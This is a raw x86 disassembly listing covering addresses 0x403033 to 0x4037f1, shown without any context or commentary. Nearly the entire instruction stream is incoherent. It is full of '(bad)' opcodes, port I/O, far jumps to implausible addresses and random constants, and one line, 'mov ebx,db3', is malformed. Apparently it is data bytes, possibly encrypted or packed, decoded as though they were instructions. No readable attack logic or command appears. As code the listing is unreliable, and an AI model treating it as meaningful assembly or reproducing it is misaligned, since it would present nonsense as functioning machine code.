  403033:	push   0x4e
  403035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403036:	scas   al,BYTE PTR es:[edi]
  403037:	sar    BYTE PTR [esi+0x6],cl
  40303a:	sub    ch,ah
  40303c:	into   
  40303d:	ja     0x403023
  40303f:	jb     0x40307b
  403041:	mov    esp,0x6756af89
  403046:	sar    BYTE PTR [ebp-0x145877c5],cl
  40304c:	sub    eax,0x7402f247
  403051:	and    al,0xaf
  403053:	xchg   edi,eax
  403054:	mov    BYTE PTR [edx-0x340ff4c8],0xc7
  40305b:	(bad)  
  40305c:	or     esp,esi
  40305e:	std    
  40305f:	push   es
  403060:	mov    ax,WORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fist   DWORD PTR [edx-0x75]
  403077:	jle    0x40301d
  403079:	sahf   
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	add    DWORD PTR [edx-0x4],0xacc4081
  403088:	scas   eax,DWORD PTR es:[edi]
  403089:	pop    ebx
  40308a:	adc    al,0x88
  40308c:	es inc ecx
  40308e:	xor    DWORD PTR [ecx-0x1d1aeb9e],ecx
  403094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403095:	mov    edx,0x3b2db6c6
  40309a:	xchg   DWORD PTR [ecx-0x53],ebx
  40309d:	xchg   edx,eax
  40309e:	xchg   esp,eax
  40309f:	sub    ecx,ebx
  4030a1:	repz fucomi st,st(7)
  4030a4:	cmc    
  4030a5:	outs   dx,BYTE PTR ds:[esi]
  4030a6:	lds    eax,FWORD PTR [edi]
  4030a8:	mov    bl,0x31
  4030aa:	jge    0x403070
  4030ac:	push   0xffffffe9
  4030ae:	cdq    
  4030af:	dec    ebx
  4030b0:	mov    bl,ch
  4030b2:	addr16 push ebx
  4030b4:	sub    DWORD PTR [ecx+ecx*8],ebp
  4030b7:	xor    DWORD PTR [edx+0x3f3e44d6],0x75853849
  4030c1:	sbb    eax,0x9d716a36
  4030c6:	rcr    DWORD PTR [eax+0x5d877439],0xdc
  4030cd:	data16 xor BYTE PTR [edx+0x493094c8],al
  4030d4:	rol    DWORD PTR cs:[ebx],1
  4030d7:	std    
  4030d8:	or     DWORD PTR [eax],edi
  4030da:	mov    ah,0xb8
  4030dc:	and    al,0x1e
  4030de:	ret    
  4030df:	loope  0x403139
  4030e1:	popa   
  4030e2:	fs int 0xe1
  4030e5:	push   edi
  4030e6:	mov    al,0x7e
  4030e8:	jne    0x4030f0
  4030ea:	ret    
  4030eb:	rol    DWORD PTR [ecx],cl
  4030ed:	pop    ss
  4030ee:	in     eax,dx
  4030ef:	cmp    BYTE PTR [edx-0x3e],dh
  4030f2:	add    BYTE PTR cs:[ebp+0x29],0x2f
  4030f7:	or     BYTE PTR [edi-0x36],dh
  4030fa:	in     eax,dx
  4030fb:	fdiv   DWORD PTR [ebp+0x5d]
  4030fe:	(bad)  
  4030ff:	push   ebp
  403100:	push   edi
  403101:	pop    es
  403102:	mov    edx,DWORD PTR [edx-0x7b]
  403105:	int3   
  403106:	dec    eax
  403107:	sub    dl,bl
  403109:	mov    al,0x5a
  40310b:	xchg   esp,eax
  40310c:	(bad)  
  40310d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40310e:	outs   dx,DWORD PTR ds:[esi]
  40310f:	sahf   
  403110:	mov    ds:0xff5fec1b,al
  403115:	add    BYTE PTR [esi-0x47],al
  403118:	enter  0xcaec,0x6e
  40311c:	jmp    0x45e6df68
  403121:	push   es
  403122:	adc    BYTE PTR [ebp-0x4c],bl
  403125:	out    dx,eax
  403126:	cli    
  403127:	and    edi,DWORD PTR [edi-0x5d]
  40312a:	xor    DWORD PTR [ebx],ebx
  40312c:	addr16 int 0x47
  40312f:	dec    edi
  403130:	jecxz  0x4030c1
  403132:	cmc    
  403133:	cmp    DWORD PTR [esp+edi*8+0x14],esp
  403137:	add    DWORD PTR [esi-0x5d],ecx
  40313a:	dec    esi
  40313b:	bound  ebx,QWORD PTR [edi+0x7b]
  40313e:	lock jmp 0xc49c3ae8
  403144:	add    eax,0x5d95513a
  403149:	dec    ebx
  40314a:	add    BYTE PTR [esi-0x3b],al
  40314d:	and    eax,0xfc5c97fe
  403152:	les    esp,FWORD PTR [edx+0x77]
  403155:	sub    al,0x2a
  403157:	imul   esi,DWORD PTR [edx+0x53],0xfffffff5
  40315b:	dec    ebx
  40315c:	mov    esi,ebx
  40315e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40315f:	sahf   
  403160:	ins    DWORD PTR es:[edi],dx
  403161:	or     dl,BYTE PTR [eax]
  403163:	aas    
  403164:	sub    al,0xd5
  403166:	jo     0x40319b
  403168:	call   FWORD PTR [esi]
  40316a:	outs   dx,DWORD PTR ds:[esi]
  40316b:	(bad)  
  40316c:	ins    BYTE PTR es:[edi],dx
  40316d:	rcl    BYTE PTR [ecx+0x2],cl
  403170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403171:	pop    esp
  403172:	arpl   WORD PTR [edx],si
  403174:	pop    ds
  403175:	mov    edi,0xa578d5ed
  40317a:	inc    edx
  40317b:	pushf  
  40317c:	rcl    DWORD PTR [ebx+0xd97279d],1
  403182:	(bad)  
  403183:	sti    
  403184:	das    
  403185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403186:	mov    edi,0x81f3ea7a
  40318b:	dec    esi
  40318c:	xor    al,0x64
  40318e:	lahf   
  40318f:	adc    BYTE PTR [ebx+ebx*8+0x2f],0x99
  403194:	iret   
  403195:	jmp    0x40311b
  403197:	jl     0x403217
  403199:	mov    ds:0xe07ab1f6,eax
  40319e:	xchg   esi,eax
  40319f:	pop    ds
  4031a0:	jbe    0x40319f
  4031a2:	div    edx
  4031a4:	sub    eax,0xc20cb845
  4031a9:	inc    eax
  4031aa:	sti    
  4031ab:	dec    ebx
  4031ac:	test   al,0x3b
  4031ae:	mov    DWORD PTR [eax],edx
  4031b0:	pop    ds
  4031b1:	repnz ins DWORD PTR es:[edi],dx
  4031b3:	mov    al,ds:0x3a3f0392
  4031b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031b9:	jge    0x403149
  4031bb:	and    al,0xb3
  4031bd:	(bad)  
  4031be:	loope  0x403198
  4031c0:	rol    BYTE PTR [ecx],cl
  4031c2:	mov    esp,0xf1d68275
  4031c7:	mov    al,ds:0x46f5e8fc
  4031cc:	test   DWORD PTR [ecx],edx
  4031ce:	or     cl,BYTE PTR [ebx]
  4031d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031d1:	aam    0xdd
  4031d3:	scas   eax,DWORD PTR es:[edi]
  4031d4:	mov    DWORD PTR [esi+0xa6ceb3b],ebp
  4031da:	sti    
  4031db:	loop   0x403228
  4031dd:	or     dh,BYTE PTR [ebx-0x6a4a4ea6]
  4031e3:	or     dl,BYTE PTR [ebp+0xa]
  4031e6:	mov    al,BYTE PTR [ebp+0x59f4334c]
  4031ec:	cwde   
  4031ed:	lods   al,BYTE PTR ds:[esi]
  4031ee:	(bad)  
  4031ef:	(bad)  
  4031f0:	sbb    ebx,DWORD PTR [esi+0x3e]
  4031f3:	les    ecx,FWORD PTR [eax-0xe2c0e00]
  4031f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031fa:	call   0xc5dd9939
  4031ff:	jo     0x403229
  403201:	jo     0x4031f8
  403203:	xchg   DWORD PTR ds:0x222b72c3,eax
  40320a:	cs push eax
  40320c:	daa    
  40320d:	mov    dl,0x2e
  40320f:	div    dl
  403211:	sbb    DWORD PTR [ecx+0x7965e04c],edi
  403217:	cdq    
  403218:	imul   ecx,ecx,0xffffffcc
  40321b:	or     BYTE PTR [ebx],al
  40321d:	cmp    al,0x22
  40321f:	cld    
  403220:	push   edi
  403221:	inc    ebx
  403222:	jne    0x40326a
  403224:	mov    ebx,0x95682596
  403229:	mov    ds:0x75f98b2b,al
  40322e:	dec    esp
  40322f:	in     al,dx
  403230:	mov    dh,0xa
  403232:	push   0x30
  403234:	mov    dl,0x39
  403236:	sub    bl,BYTE PTR [eiz*4-0x3fcb7e58]
  40323d:	fidiv  WORD PTR [ecx]
  40323f:	scas   al,BYTE PTR es:[edi]
  403240:	push   ebp
  403241:	(bad)  
  403242:	imul   BYTE PTR [eax+0x76ddf2e5]
  403248:	inc    esp
  403249:	scas   eax,DWORD PTR es:[edi]
  40324a:	push   ebp
  40324b:	mov    ecx,0x822897df
  403250:	sub    DWORD PTR [edx-0x6f8a9b4e],eax
  403256:	repz jge 0x4032a4
  403259:	dec    esp
  40325a:	dec    esp
  40325b:	inc    eax
  40325c:	(bad)  
  40325d:	cwde   
  40325e:	popf   
  40325f:	popa   
  403260:	mov    DWORD PTR [edi+0x49],edi
  403263:	cmp    cl,BYTE PTR [ecx+0x28]
  403266:	and    dl,BYTE PTR [esi+0x2aecee89]
  40326c:	cmp    BYTE PTR [ebx-0x28],bl
  40326f:	and    DWORD PTR [ebx+eiz*8],0x0
  403273:	inc    ecx
  403274:	add    DWORD PTR [edi-0x59],esp
  403277:	mov    dl,0xb6
  403279:	retf   
  40327a:	xor    ch,BYTE PTR [ebp-0x3c]
  40327d:	mov    edx,0x1ab8efed
  403282:	cmp    cl,dh
  403284:	sahf   
  403285:	add    BYTE PTR [ecx+esi*1-0x35fc1906],dh
  40328c:	xchg   DWORD PTR [eax],edx
  40328e:	loopne 0x4032ca
  403290:	daa    
  403291:	test   eax,0x36476761
  403296:	push   ds
  403297:	mov    al,ds:0xa5fd9c1
  40329c:	pop    edi
  40329d:	and    ebp,edi
  40329f:	jns    0x403243
  4032a1:	out    0xfc,al
  4032a3:	pop    es
  4032a4:	jb     0x4032fb
  4032a6:	shl    eax,cl
  4032a8:	(bad)  
  4032a9:	fdivr  QWORD PTR [edi-0x600e9787]
  4032af:	dec    edx
  4032b0:	xor    BYTE PTR [edx+0x6c],0x4f
  4032b4:	pusha  
  4032b5:	jmp    0x4032f5
  4032b7:	int3   
  4032b8:	ret    0xfc8c
  4032bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032bc:	mov    edx,0xba8071c2
  4032c1:	or     edx,DWORD PTR [eax+eax*2]
  4032c4:	loop   0x40328e
  4032c6:	pop    ebp
  4032c7:	jmp    0x403284
  4032c9:	ins    BYTE PTR es:[edi],dx
  4032ca:	xor    eax,0xb6737c6a
  4032cf:	jmp    0x40331e
  4032d1:	mov    esi,0xb68fcb93
  4032d6:	aaa    
  4032d7:	mov    WORD PTR [ebp-0x5ec9e0b8],cs
  4032dd:	sti    
  4032de:	dec    esp
  4032df:	inc    ecx
  4032e0:	into   
  4032e1:	sti    
  4032e2:	cli    
  4032e3:	nop
  4032e4:	addr16 ss xor al,0xc8
  4032e8:	lods   al,BYTE PTR ds:[esi]
  4032e9:	mov    ds:0x23679f18,al
  4032ee:	xchg   ebx,eax
  4032ef:	mov    ebx,DWORD PTR ds:0xaa527e2c
  4032f5:	adc    al,0x1e
  4032f7:	test   al,0x86
  4032f9:	(bad)  [eax]
  4032fb:	adc    dl,al
  4032fd:	adc    eax,0x85fa768f
  403303:	sub    eax,0xd2e3eab2
  403308:	fadd   DWORD PTR [edi-0x2e]
  40330b:	idiv   DWORD PTR ds:0x9a8e9c1a
  403311:	mov    dh,0x90
  403313:	inc    esi
  403314:	inc    ecx
  403315:	xor    edx,DWORD PTR [ecx+0x53e35dd8]
  40331b:	(bad)  
  40331c:	xor    esp,DWORD PTR [esp+edi*2-0x580ca5f4]
  403323:	or     dh,bh
  403325:	inc    ebx
  403326:	pop    es
  403327:	jmp    0x40338d
  403329:	fiadd  DWORD PTR [ebx+esi*2]
  40332c:	ins    BYTE PTR es:[edi],dx
  40332d:	and    esi,DWORD PTR [ebp+0x5ebba66e]
  403333:	dec    edi
  403334:	xlat   BYTE PTR ds:[ebx]
  403335:	inc    esp
  403336:	mov    esi,0x5a1b6de5
  40333b:	repz arpl WORD PTR ss:[ebp+0x7f6ededf],ax
  403343:	cmp    BYTE PTR [edx],dh
  403345:	dec    ecx
  403346:	outs   dx,DWORD PTR ds:[esi]
  403347:	mov    ebp,0x26d30fd4
  40334c:	js     0x403333
  40334e:	data16 int3 
  403350:	sbb    eax,0xf2fd4351
  403355:	inc    ebp
  403356:	lahf   
  403357:	ret    0x3760
  40335a:	cdq    
  40335b:	add    cl,BYTE PTR [eax]
  40335d:	je     0x4033c2
  40335f:	(bad)  
  403360:	pop    ecx
  403361:	dec    esi
  403362:	mov    BYTE PTR [edi+0xbce5fd8],0x32
  403369:	or     al,0x5a
  40336b:	int    0xe2
  40336d:	ins    BYTE PTR es:[edi],dx
  40336e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40336f:	rcr    BYTE PTR [ecx+0x7e],1
  403372:	push   ebx
  403373:	popf   
  403374:	cmp    al,0xa8
  403376:	jg     0x4033cb
  403378:	mov    BYTE PTR [edi+eax*2-0x7c],dl
  40337c:	jbe    0x40334b
  40337e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40337f:	pop    edi
  403380:	xchg   esp,eax
  403381:	ins    DWORD PTR es:[edi],dx
  403382:	daa    
  403383:	aaa    
  403384:	push   ds
  403385:	and    al,BYTE PTR [ebp-0x63c483e0]
  40338b:	inc    edi
  40338c:	fwait
  40338d:	cmp    eax,0xe9bda31e
  403392:	pop    edi
  403393:	inc    ebx
  403394:	les    edi,FWORD PTR [edx+eax*1+0x1e2f5d3d]
  40339b:	add    DWORD PTR [ecx+0x7f38d744],eax
  4033a1:	pop    es
  4033a2:	mov    ebx,0xf19331c5
  4033a7:	xor    BYTE PTR [ebp+eiz*8+0x11],dh
  4033ab:	jmp    0x526a:0xf75d8569
  4033b2:	cmp    edx,edi
  4033b4:	hlt    
  4033b5:	out    0x8a,eax
  4033b7:	cs and al,0x40
  4033ba:	or     eax,0xc5d0a0d7
  4033bf:	hlt    
  4033c0:	out    dx,al
  4033c1:	mov    ah,0xd7
  4033c3:	fs inc esi
  4033c5:	rcl    DWORD PTR [edx-0x2f3148b2],1
  4033cb:	mov    ds:0xca43b96,eax
  4033d0:	jne    0x4033dd
  4033d2:	mov    ds:0xb9b32e81,eax
  4033d7:	ror    DWORD PTR [esi-0x47af36aa],0x6d
  4033de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033df:	rcl    esp,1
  4033e1:	push   0x1d9915f2
  4033e6:	imul   BYTE PTR [ebx+0x37]
  4033e9:	rol    ch,1
  4033eb:	xor    ebx,DWORD PTR [ecx-0x6c34e7e7]
  4033f1:	inc    ecx
  4033f2:	push   es
  4033f3:	sub    DWORD PTR [ecx-0x316eb965],ebx
  4033f9:	rcr    BYTE PTR [ecx+0x531f27a6],1
  4033ff:	fld    QWORD PTR [esi+0x6c]
  403402:	aaa    
  403403:	loopne 0x403447
  403405:	sbb    eax,0xe8efe076
  40340a:	pusha  
  40340b:	sbb    al,0x54
  40340d:	dec    ebx
  40340e:	inc    esi
  40340f:	mov    cl,BYTE PTR [esi]
  403411:	jb     0x403463
  403413:	or     BYTE PTR [ebp-0x75],dl
  403416:	jge    0x403420
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	adc    al,0x94
  403435:	sahf   
  403436:	cmp    esp,DWORD PTR [edx]
  403438:	push   ds
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	mov    edx,0xa00bdf05
  403444:	push   ebp
  403445:	mov    al,ds:0x427c292d
  40344a:	dec    eax
  40344b:	xlat   BYTE PTR ds:[ebx]
  40344c:	push   edx
  40344d:	xchg   ecx,eax
  40344e:	mov    esp,0x7d1a8c9e
  403453:	inc    esp
  403454:	fmul   QWORD PTR [bp+di+0x3474]
  403459:	jnp    0x403415
  40345b:	add    esp,DWORD PTR [edx]
  40345d:	mov    ds:0x5e2f7c67,eax
  403462:	jmp    0x403411
  403464:	arpl   WORD PTR [edx-0x69cdfd83],cx
  40346a:	pop    eax
  40346b:	sub    al,BYTE PTR [eax]
  40346d:	fwait
  40346e:	xor    edi,DWORD PTR [ebx+esi*8-0x289d7b52]
  403475:	ja     0x403466
  403477:	arpl   bp,bp
  403479:	ficom  WORD PTR [eax+0x1e]
  40347c:	ins    DWORD PTR es:[edi],dx
  40347d:	loope  0x403447
  40347f:	dec    edx
  403480:	jg     0x40346c
  403482:	push   0x1c072a89
  403487:	cmp    edx,esp
  403489:	mov    eax,0xc22b6171
  40348e:	push   ebx
  40348f:	add    DWORD PTR [ebx-0x592264d4],edx
  403495:	sbb    DWORD PTR [eax-0x2166d60f],eax
  40349b:	sub    BYTE PTR [edi-0x6d0a03d1],cl
  4034a1:	push   esi
  4034a2:	js     0x40349f
  4034a4:	pop    esi
  4034a5:	adc    ecx,esi
  4034a7:	daa    
  4034a8:	push   ecx
  4034a9:	jecxz  0x4034c5
  4034ab:	aas    
  4034ac:	mov    eax,DWORD PTR [ecx]
  4034ae:	loope  0x403496
  4034b0:	loopne 0x4034c6
  4034b2:	popa   
  4034b3:	pop    edi
  4034b4:	mov    gs,WORD PTR ds:0x9850e75d
  4034ba:	in     al,dx
  4034bb:	sub    dh,ch
  4034bd:	rcr    al,cl
  4034bf:	ins    DWORD PTR es:[edi],dx
  4034c0:	ror    DWORD PTR [ebx+0x25],1
  4034c3:	xor    ah,0xc1
  4034c6:	xchg   ebp,eax
  4034c7:	adc    BYTE PTR [edi-0x56],0x87
  4034cb:	cli    
  4034cc:	push   cs
  4034cd:	mov    bl,BYTE PTR [eax+0x162e9686]
  4034d3:	dec    ebp
  4034d4:	mov    al,ds:0x3e4e00db
  4034d9:	loopne 0x403489
  4034db:	xor    al,0x7a
  4034dd:	imul   ch
  4034df:	and    ecx,edx
  4034e1:	rol    DWORD PTR [edi],0xdb
  4034e4:	ss push ds
  4034e6:	add    ah,BYTE PTR [ebp-0x701896b4]
  4034ec:	sub    BYTE PTR [esi-0xe],0x35
  4034f0:	jg     0x4034e5
  4034f2:	or     ebp,DWORD PTR [ebp+edi*1+0x661555b8]
  4034f9:	mov    ds:0x18c3b782,al
  4034fe:	jmp    0x403492
  403500:	imul   ebp,DWORD PTR [esi],0x1e2ec2de
  403506:	dec    ebx
  403507:	shr    bh,1
  403509:	sti    
  40350a:	pop    edi
  40350b:	int3   
  40350c:	push   0x775aed77
  403511:	repz push ss
  403513:	outs   dx,BYTE PTR ds:[esi]
  403514:	out    0xae,eax
  403516:	loop   0x4034a7
  403518:	fnstenv [edi]
  40351a:	cmp    al,0xff
  40351c:	xor    dh,BYTE PTR [edi+0x68f9374a]
  403522:	aaa    
  403523:	sbb    ah,0xe7
  403526:	or     dl,BYTE PTR [ebp-0x18]
  403529:	neg    DWORD PTR [eax+0x448e5cd8]
  40352f:	jle    0x4034f9
  403531:	aam    0xd3
  403533:	rcl    DWORD PTR [ecx-0x33abcbb1],0x1f
  40353a:	mov    ebx,0xfb6a01ee
  40353f:	adc    DWORD PTR [edi-0x73],0xb22e6bcd
  403546:	in     eax,0x65
  403548:	jo     0x40354d
  40354a:	mov    edi,0xe0bb257b
  40354f:	out    0xd2,al
  403551:	loopne 0x403523
  403553:	aam    0xd7
  403555:	in     al,dx
  403556:	inc    esi
  403557:	out    0x74,eax
  403559:	or     bl,BYTE PTR [eax+0x1c5484dc]
  40355f:	jo     0x403557
  403561:	fstp   TBYTE PTR [edx-0x43]
  403564:	cmc    
  403565:	add    esi,edx
  403567:	mov    eax,0xb74827e9
  40356c:	loope  0x4034fa
  40356e:	xor    al,0x6d
  403570:	add    BYTE PTR [edx+0x28188130],bl
  403576:	(bad)  
  403577:	rcr    DWORD PTR [edi+0x48eee030],0x7e
  40357e:	rcr    BYTE PTR [edx],0xd8
  403581:	pop    ebx
  403582:	paddusw mm5,mm7
  403585:	xchg   DWORD PTR [esi-0x5],eax
  403588:	push   esi
  403589:	dec    esi
  40358a:	xchg   ecx,eax
  40358b:	aad    0xff
  40358d:	add    eax,0x35f2d0da
  403592:	add    ebp,0x1f008e8
  403598:	(bad)  
  403599:	stc    
  40359a:	inc    eax
  40359b:	outs   dx,BYTE PTR ds:[esi]
  40359c:	xor    ah,bh
  40359e:	mov    esi,0xd019902b
  4035a3:	adc    bh,bh
  4035a5:	pop    esi
  4035a6:	popa   
  4035a7:	gs ja  0x4035bc
  4035aa:	pusha  
  4035ab:	aaa    
  4035ac:	mov    bl,0x6e
  4035ae:	jae    0x403585
  4035b0:	pop    ss
  4035b1:	sahf   
  4035b2:	cmp    eax,0x49ebe9c
  4035b7:	shr    BYTE PTR [esi],0x25
  4035ba:	retf   
  4035bb:	call   0x17c62d3d
  4035c0:	test   al,0xe5
  4035c2:	add    al,0x1f
  4035c4:	dec    esp
  4035c5:	pushf  
  4035c6:	fiadd  DWORD PTR [ebx]
  4035c8:	repz repnz out 0x83,eax
  4035cc:	xchg   esi,eax
  4035cd:	lods   eax,DWORD PTR ds:[esi]
  4035ce:	cmp    BYTE PTR [ecx+ebp*4+0x59a558f7],0xed
  4035d6:	sub    eax,DWORD PTR [ecx-0x68]
  4035d9:	pop    edx
  4035da:	cld    
  4035db:	or     al,0x25
  4035dd:	test   al,0x44
  4035df:	sti    
  4035e0:	into   
  4035e1:	inc    esp
  4035e2:	call   DWORD PTR [edx+edx*8+0x4899b578]
  4035e9:	push   cs
  4035ea:	mov    ax,ds:0x6ad4ffab
  4035f0:	mov    dl,0xdb
  4035f2:	xor    bl,BYTE PTR [esi-0x63]
  4035f5:	pop    esi
  4035f6:	inc    ebx
  4035f7:	or     DWORD PTR [ebx+eiz*8],ebp
  4035fa:	sub    DWORD PTR [esi+0x78345f47],edx
  403600:	fstp   DWORD PTR [ebx+ecx*8]
  403603:	adc    ch,BYTE PTR [edx+0x1d]
  403606:	mov    ch,0xa6
  403608:	daa    
  403609:	xor    al,0xc3
  40360b:	dec    edx
  40360c:	xor    BYTE PTR [edi+ebx*2],dh
  40360f:	sti    
  403610:	gs leave 
  403612:	add    esp,DWORD PTR [esi]
  403614:	ret    0x7787
  403617:	sbb    DWORD PTR [eax-0x52],ecx
  40361a:	fistp  DWORD PTR [eax]
  40361c:	pop    ds
  40361d:	dec    ebx
  40361e:	cwde   
  40361f:	inc    esi
  403620:	shl    ah,cl
  403622:	jno    0x4036a0
  403624:	in     eax,0x90
  403626:	shl    BYTE PTR ds:0x404be35a,cl
  40362c:	loop   0x403622
  40362e:	cmp    DWORD PTR [esi-0x7a],eax
  403631:	sar    BYTE PTR [ebp+0x1a9d0859],cl
  403637:	push   0x794cce2e
  40363c:	out    0x42,al
  40363e:	sub    eax,0x40e6c1d8
  403643:	or     DWORD PTR [esi],ebx
  403645:	mov    WORD PTR [eax+0x48],ds
  403648:	je     0x4036c1
  40364a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40364b:	cs imul ecx,esi,0xf7d8c3d9
  403652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403653:	pop    edx
  403654:	push   eax
  403655:	dec    esi
  403656:	test   al,0xf8
  403658:	mov    ah,bl
  40365a:	xor    ebx,eax
  40365c:	repz cmc 
  40365e:	icebp  
  40365f:	inc    edi
  403660:	cwde   
  403661:	xchg   ebp,eax
  403662:	fs xchg ebx,eax
  403664:	jne    0x40361b
  403666:	dec    edi
  403667:	mov    eax,ds:0xe68cc75e
  40366c:	push   ebx
  40366d:	(bad)  
  40366e:	mov    al,ds:0xb364fc01
  403673:	pop    ebp
  403674:	rcl    DWORD PTR [esi],0x59
  403677:	les    edx,FWORD PTR [ebx+0x3f]
  40367a:	cmc    
  40367b:	fistp  QWORD PTR [esi]
  40367d:	popa   
  40367e:	and    eax,0x9326f6c1
  403683:	ds leave 
  403685:	es clc 
  403687:	nop    DWORD PTR [esi+edx*1-0x62]
  40368c:	sub    DWORD PTR [edi],edx
  40368e:	xor    dl,BYTE PTR [eax]
  403690:	das    
  403691:	fist   WORD PTR [eax+edx*4+0x687fecc7]
  403698:	les    edx,FWORD PTR [eax+0x3]
  40369b:	es iret 
  40369d:	arpl   WORD PTR [eax-0x1c],di
  4036a0:	cli    
  4036a1:	fcomp  QWORD PTR [ebx-0x45c75bfb]
  4036a7:	dec    edi
  4036a8:	or     eax,0x1b134d7
  4036ad:	mov    WORD PTR [ebx+0x23],cs
  4036b0:	xlat   BYTE PTR ds:[ebx]
  4036b1:	sbb    esp,DWORD PTR [ecx-0x644051d2]
  4036b7:	jmp    0x1a91:0xedc6b05
  4036be:	cmp    ebp,esi
  4036c0:	adc    cl,ah
  4036c2:	add    DWORD PTR [esi],0xffffffcc
  4036c5:	push   es
  4036c6:	mov    edi,0x26734750
  4036cb:	pop    ecx
  4036cc:	sbb    eax,0x8cf072c2
  4036d1:	fs pop ebp
  4036d3:	cmp    al,0xf3
  4036d6:	or     edi,DWORD PTR [ebp-0x6b]
  4036d9:	mov    bh,0x12
  4036db:	(bad)  
  4036dc:	fdivr  st(5),st
  4036de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036df:	jl     0x403677
  4036e1:	lahf   
  4036e2:	or     edx,eax
  4036e4:	dec    ebp
  4036e5:	ja     0x40370c
  4036e7:	sti    
  4036e8:	sub    DWORD PTR [edx],0x8ef1fd8e
  4036ee:	(bad)
  4036f3:	jne    0x403691
  4036f5:	push   es
  4036f6:	popa   
  4036f7:	jmp    0x7b6cd2eb
  4036fc:	xchg   edx,eax
  4036fd:	pop    es
  4036fe:	pop    ecx
  4036ff:	sub    BYTE PTR [edi+ebp*4-0x2fb431c3],ah
  403706:	add    eax,0x44c831ad
  40370b:	inc    esp
  40370c:	add    BYTE PTR [eax+0xb2b6ba],dl
  403712:	test   DWORD PTR [edx],esp
  403714:	pushf  
  403715:	sbb    eax,0x38e077b5
  40371a:	xchg   esi,eax
  40371b:	xor    DWORD PTR [ebx],edx
  40371d:	inc    ecx
  40371e:	pop    esi
  40371f:	inc    ebp
  403720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403721:	sub    eax,0xc91586b8
  403726:	popa   
  403727:	std    
  403728:	test   eax,0x525e942c
  40372d:	aam    0x66
  40372f:	mov    bl,0x8
  403731:	int    0x53
  403733:	nop
  403734:	mov    ebx,db3
  403737:	pop    edx
  403738:	js     0x40379f
  40373a:	adc    DWORD PTR [ebx+0x47b1fad7],edx
  403740:	adc    esp,esi
  403742:	dec    ebp
  403743:	cs push 0x9c0ceb54
  403749:	xchg   DWORD PTR [edx],esi
  40374b:	jno    0x403729
  40374d:	icebp  
  40374e:	mov    eax,cs:0xd00f9c36
  403754:	xchg   ebp,eax
  403755:	push   edi
  403756:	and    BYTE PTR [ebp+0x72],dh
  403759:	jmp    0xfb4d:0x26d54c07
  403760:	cli    
  403761:	mov    eax,ds:0x5bca8ae0
  403766:	in     eax,0x5d
  403768:	out    dx,al
  403769:	jl     0x403777
  40376b:	inc    esi
  40376c:	xchg   edx,eax
  40376d:	imul   ebx,esp,0x2d
  403770:	xor    bh,ah
  403772:	mov    ah,0xc5
  403774:	inc    eax
  403775:	shl    DWORD PTR [edx],0xd3
  403778:	ror    BYTE PTR [esi+0x46],1
  40377b:	pop    ds
  40377c:	push   ss
  40377d:	mov    esp,0xaf214775
  403782:	retf   0x7615
  403785:	inc    ecx
  403786:	ja     0x40377d
  403788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403789:	and    edx,DWORD PTR [edi+0x1e]
  40378c:	stos   DWORD PTR es:[edi],eax
  40378d:	lods   al,BYTE PTR ds:[esi]
  40378e:	push   0xffffffac
  403790:	adc    edx,DWORD PTR [eax+0x75cd93ec]
  403796:	mov    eax,fs:0xa1bd47ce
  40379c:	retf   
  40379d:	xor    ebx,0x0
  4037a0:	dec    ecx
  4037a1:	xchg   BYTE PTR [edi],cl
  4037a3:	or     ah,cl
  4037a5:	push   ecx
  4037a6:	push   eax
  4037a7:	sbb    bh,BYTE PTR [eax+esi*4-0x68]
  4037ab:	inc    ecx
  4037ac:	push   ebp
  4037ad:	dec    ebp
  4037ae:	shl    DWORD PTR [ecx],1
  4037b0:	lea    edx,[edx]
  4037b2:	cli    
  4037b3:	push   ecx
  4037b4:	cli    
  4037b5:	cmp    BYTE PTR [ebp+0x3d],dl
  4037b8:	out    0x2f,eax
  4037ba:	pop    esi
  4037bb:	sub    DWORD PTR [edx-0x7b8c8d20],esp
  4037c1:	mov    ebx,0xbf96a4e0
  4037c6:	jge    0x403784
  4037c8:	out    dx,al
  4037c9:	repnz jecxz 0x403772
  4037cc:	pop    ss
  4037cd:	shl    DWORD PTR [eax-0x37],0x98
  4037d1:	sub    ebp,DWORD PTR [ecx-0x46]
  4037d4:	push   es
  4037d5:	cmp    eax,DWORD PTR [eax]
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
